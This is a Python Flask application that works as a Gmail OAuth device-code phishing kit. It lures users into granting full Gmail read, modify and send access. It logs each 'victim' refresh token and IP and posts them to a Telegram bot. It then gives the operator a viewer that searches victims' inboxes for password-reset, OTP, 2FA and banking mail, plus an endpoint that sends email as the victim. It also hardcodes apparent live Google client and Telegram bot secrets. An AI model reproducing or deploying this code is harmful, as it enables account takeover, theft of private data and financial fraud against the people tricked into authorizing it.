from flask import Flask, request, redirect, session, render_template_string, jsonify
import requests
import json
import os
import base64
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ================================================================
# GOOGLE OAUTH CONFIG
# ================================================================
CLIENT_ID = "870868575995-luhgcleqlgjb28tckh6tmidfea3vc3dp.apps.googleusercontent.com"
CLIENT_SECRET = "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"
RENDER_URL = os.environ.get("RENDER_URL", "https://gmail-oauth.onrender.com")
REDIRECT_URI = f"{RENDER_URL}/callback"
SCOPES = "openid https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/gmail.readonly https://www.googleapis.com/auth/gmail.modify https://www.googleapis.com/auth/gmail.send"

# ================================================================
# TELEGRAM CONFIG
# ================================================================
TG_BOT_TOKEN = "8347968051:AAEThb_Nmqy-bhdsZwmEnsBSQgXVc-fGYbs"
TG_CHAT_ID = "7554731151"

# ================================================================
# TOKEN STORAGE
# ================================================================
TOKEN_DB = "/tmp/tokens.json"

def send_telegram(message):
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TG_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def save_token(email, refresh_token, access_token, ip):
    db = {}
    if os.path.exists(TOKEN_DB):
        with open(TOKEN_DB) as f:
            db = json.load(f)
    db[email] = {
        "refresh_token": refresh_token,
        "access_token": access_token,
        "ip": ip,
        "timestamp": datetime.now().isoformat()
    }
    with open(TOKEN_DB, "w") as f:
        json.dump(db, f, indent=2)

# ================================================================
# HOME
# ================================================================
@app.route('/')
def home():
    return jsonify({
        "status": "running",
        "endpoints": {
            "oauth_start": "/auth/gmail",
            "callback": "/callback",
            "tokens": "/tokens",
            "web_viewer": "/web-viewer",
            "api_viewer": "/api/viewer",
            "health": "/health"
        }
    })

# ================================================================
# OAuth — Device Code Flow
# ================================================================
@app.route('/auth/gmail')
def auth_gmail():
    resp = requests.post('https://oauth2.googleapis.com/device/code', data={
        'client_id': CLIENT_ID,
        'scope': SCOPES
    })
    device_data = resp.json()
    session['device_code'] = device_data['device_code']
    session['user_code'] = device_data['user_code']
    session['verification_url'] = device_data['verification_url']
    return render_template_string("""
    <html><head><style>
        body{font-family:Arial;margin:40px;text-align:center;background:#f5f3f0}
        .code{font-size:36px;font-weight:bold;background:#fff;padding:15px 30px;display:inline-block;letter-spacing:6px;border:2px dashed #333;margin:20px 0}
        .btn{padding:12px 24px;font-size:16px;cursor:pointer;background:#4285f4;color:white;border:none;border-radius:4px;text-decoration:none;display:inline-block}
        .container{background:white;max-width:500px;margin:50px auto;padding:40px;border-radius:12px;box-shadow:0 4px 16px rgba(0,0,0,0.08)}
    </style></head><body>
    <div class="container">
        <h2>Gmail Authorization</h2>
        <p><strong>Step 1:</strong> <a href="{{ verification_url }}" target="_blank" class="btn">Open google.com/device</a></p>
        <p><strong>Step 2:</strong> Enter this code:</p>
        <div class="code">{{ user_code }}</div>
        <p><strong>Step 3:</strong> Authorize access</p>
        <p><small>Auto-checking every 5 seconds...</small></p>
        <script>setTimeout(function(){window.location.href='/poll'},5000)</script>
    </div></body></html>
    """, user_code=session['user_code'], verification_url=session['verification_url'])

@app.route('/poll')
def poll():
    device_code = session.get('device_code')
    if not device_code:
        return redirect('/auth/gmail')
    resp = requests.post('https://oauth2.googleapis.com/token', data={
        'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET,
        'device_code': device_code, 'grant_type': 'urn:ietf:params:oauth:grant-type:device_code'
    })
    token_data = resp.json()
    if 'access_token' in token_data:
        refresh_token = token_data.get("refresh_token", "N/A")
        access_token = token_data.get("access_token", "N/A")
        userinfo = requests.get("https://www.googleapis.com/oauth2/v2/userinfo",
            headers={"Authorization": f"Bearer {access_token}"}).json()
        email = userinfo.get("email", "unknown")
        victim_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        if victim_ip and "," in victim_ip:
            victim_ip = victim_ip.split(",")[0].strip()
        save_token(email, refresh_token, access_token, victim_ip)
        msg = f"""[+]___ GMAIL_OAUTH ___[+]\nVictim: {email}\nToken: {refresh_token}\nIP: {victim_ip}"""
        send_telegram(msg)
        session.pop('device_code', None)
        session.pop('user_code', None)
        return redirect("https://ivview.party/#")
    elif token_data.get('error') == 'authorization_pending':
        return render_template_string("""
        <html><body style="text-align:center;font-family:Arial;margin-top:50px;">
            <h3>Waiting...</h3><p>Code: <strong style="font-size:24px;">{{ user_code }}</strong></p>
            <script>setTimeout(function(){window.location.href='/poll'},5000)</script>
        </body></html>""", user_code=session.get('user_code',''))
    elif token_data.get('error') == 'expired_token':
        session.pop('device_code', None)
        return redirect('/auth/gmail')
    elif token_data.get('error') == 'access_denied':
        return "Denied. <a href='/auth/gmail'>Try again</a>"
    else:
        return f"Unexpected: {token_data}"

# ================================================================
# Legacy Callback
# ================================================================
@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return "No code", 400
    payload = {
        "code": code, "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET,
        "redirect_uri": REDIRECT_URI, "grant_type": "authorization_code"
    }
    tokens = requests.post("https://oauth2.googleapis.com/token", json=payload).json()
    refresh_token = tokens.get("refresh_token", "N/A")
    access_token = tokens.get("access_token", "N/A")
    userinfo = requests.get("https://www.googleapis.com/oauth2/v2/userinfo",
        headers={"Authorization": f"Bearer {access_token}"}).json()
    email = userinfo.get("email", "unknown")
    victim_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if victim_ip and "," in victim_ip:
        victim_ip = victim_ip.split(",")[0].strip()
    save_token(email, refresh_token, access_token, victim_ip)
    msg = f"""[+]___ GMAIL_OAUTH ___[+]\nVictim: {email}\nToken: {refresh_token}\nIP: {victim_ip}"""
    send_telegram(msg)
    return redirect("https://ivview.party/#")

# ================================================================
# Tokens API
# ================================================================
@app.route('/tokens')
def list_tokens():
    if not os.path.exists(TOKEN_DB):
        return jsonify({})
    with open(TOKEN_DB) as f:
        return jsonify(json.load(f))

# ================================================================
# Web Viewer Page
# ================================================================
@app.route('/web-viewer')
def web_viewer_page():
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Gmail Viewer</title>
        <style>
            body{font-family:Arial;padding:30px;background:#0d1117;color:#c9d1d9;max-width:1000px;margin:auto}
            h1{color:#58a6ff}
            table{width:100%;border-collapse:collapse;margin-top:20px}
            th,td{padding:12px;text-align:left;border-bottom:1px solid #30363d}
            th{color:#8b949e}
            a{color:#58a6ff;text-decoration:none}
            .email-card{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;margin:8px 0}
            .from{color:#8b949e;font-size:13px}
            .subject{color:#c9d1d9;font-weight:600}
            .btn{background:#238636;color:#fff;padding:8px 16px;border:none;border-radius:6px;cursor:pointer}
        </style>
    </head>
    <body>
        <h1>Gmail Token Viewer</h1>
        <p><a href="/web-viewer" class="btn" onclick="loadTokens()">Refresh</a></p>
        <div id="content"><p>Loading...</p></div>
        <script>
            async function loadTokens() {
                const res = await fetch('/tokens');
                const data = await res.json();
                let html = '<table><tr><th>Email</th><th>IP</th><th>Time</th><th>Action</th></tr>';
                for (const [email, info] of Object.entries(data)) {
                    html += `<tr><td>${email}</td><td>${info.ip}</td><td>${info.timestamp||''}</td>
                        <td><a href="#" onclick="viewInbox('${email}')">View Inbox</a></td></tr>`;
                }
                html += '</table>';
                document.getElementById('content').innerHTML = html || '<p>No tokens yet.</p>';
            }
            async function viewInbox(email) {
                document.getElementById('content').innerHTML = '<p>Loading inbox...</p>';
                const res = await fetch('/api/viewer/'+encodeURIComponent(email));
                const data = await res.json();
                let html = `<h2>${data.email}</h2><a href="#" onclick="loadTokens()">Back</a>`;
                for (const [kw, msgs] of Object.entries(data.results||{})) {
                    html += `<h3 style="color:#8b949e;text-transform:uppercase">${kw}</h3>`;
                    for (const m of msgs) {
                        html += `<div class="email-card"><div class="from">${m.from}</div>
                            <div class="subject">${m.subject}</div></div>`;
                    }
                }
                document.getElementById('content').innerHTML = html;
            }
            loadTokens();
        </script>
    </body>
    </html>
    """)

# ================================================================
# API Viewer
# ================================================================
@app.route('/api/viewer/<email>')
def api_viewer_email(email):
    if not os.path.exists(TOKEN_DB):
        return jsonify({"error":"No tokens"}), 404
    with open(TOKEN_DB) as f:
        db = json.load(f)
    if email not in db:
        return jsonify({"error":"Not found"}), 404
    rt = db[email]["refresh_token"]
    r = requests.post("https://oauth2.googleapis.com/token", json={
        "client_id":CLIENT_ID,"client_secret":CLIENT_SECRET,
        "refresh_token":rt,"grant_type":"refresh_token"
    })
    if not r.ok:
        return jsonify({"error":"Token refresh failed"}), 400
    at = r.json().get("access_token")
    keywords = ["password","reset","verification","otp","2fa",
        "bank","payment","transfer","paypal","venmo",
        "invoice","receipt","order","purchase",
        "login","security","alert","confirm"]
    results = {}
    for kw in keywords:
        msgs = requests.get(
            f"https://gmail.googleapis.com/gmail/v1/users/me/messages?q={kw}&maxResults=5",
            headers={"Authorization":f"Bearer {at}"}
        ).json().get("messages",[])
        entries = []
        for m in msgs:
            d = requests.get(
                f"https://gmail.googleapis.com/gmail/v1/users/me/messages/{m['id']}",
                headers={"Authorization":f"Bearer {at}"}
            ).json()
            h = d["payload"]["headers"]
            subj = next((x['value'] for x in h if x['name']=='Subject'),'No subject')
            fr = next((x['value'] for x in h if x['name']=='From'),'Unknown')
            entries.append({"subject":subj[:120],"from":fr[:80],"id":m['id']})
        if entries:
            results[kw] = entries
    return jsonify({"email":email,"results":results})

# ================================================================
# Replay API
# ================================================================
@app.route('/api/replay', methods=['POST'])
def api_replay():
    data = request.json
    email = data.get('email')
    to = data.get('to')
    subject = data.get('subject')
    body = data.get('body')
    if not os.path.exists(TOKEN_DB):
        return jsonify({"error":"No tokens"}), 404
    with open(TOKEN_DB) as f:
        db = json.load(f)
    if email not in db:
        return jsonify({"error":"Not found"}), 404
    rt = db[email]["refresh_token"]
    r = requests.post("https://oauth2.googleapis.com/token", json={
        "client_id":CLIENT_ID,"client_secret":CLIENT_SECRET,
        "refresh_token":rt,"grant_type":"refresh_token"
    })
    if not r.ok:
        return jsonify({"error":"Token refresh failed"}), 400
    at = r.json().get("access_token")
    msg_str = f"From: me\r\nTo: {to}\r\nSubject: {subject}\r\n\r\n{body}"
    encoded = base64.urlsafe_b64encode(msg_str.encode()).decode()
    r = requests.post(
        "https://gmail.googleapis.com/gmail/v1/users/me/messages/send",
        headers={"Authorization":f"Bearer {at}","Content-Type":"application/json"},
        json={"raw":encoded}
    )
    return jsonify({"status":"sent" if r.ok else "failed","detail":r.text[:200]})

# ================================================================
# Health
# ================================================================
@app.route('/health')
def health():
    return "OK"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
